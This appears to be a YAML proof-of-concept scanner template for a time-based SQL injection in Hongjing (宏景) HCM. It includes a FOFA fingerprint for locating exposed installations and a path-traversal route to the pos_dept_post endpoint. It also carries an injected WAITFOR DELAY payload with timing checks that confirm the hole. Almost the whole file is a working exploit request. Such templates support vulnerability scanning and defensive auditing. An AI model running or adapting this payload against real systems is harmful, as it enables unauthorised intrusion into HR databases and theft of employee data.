id: poc-yaml-hongjing-hcm-pos-dept-post-sqli
info:
  name: 宏景HCM pos_dept_post SQL注入漏洞
  severity: high
  tags:
  - sql-injection
  finger: 宏景 HCM
  fofa: app="HJSOFT-HCM"
variables:
  t1: random_int(5,10)
  t2: t1 + 2
requests:
- method: GET
  path: /login/index.html
  expression: status_code == 200 && contains(body,"宏景软件")
- method: POST
  path: /templates/attestation/../../pos/roleinfo/pos_dept_post
  headers:
    Content-Type: application/x-www-form-urlencoded
  data: usertable=h00&usernumber=1&i9999=-1';WAITFOR DELAY '0:0:{{.t1}}'--+
  expression: status_code == 200 && body == "" && duration > t1 && duration < t2
transport: http
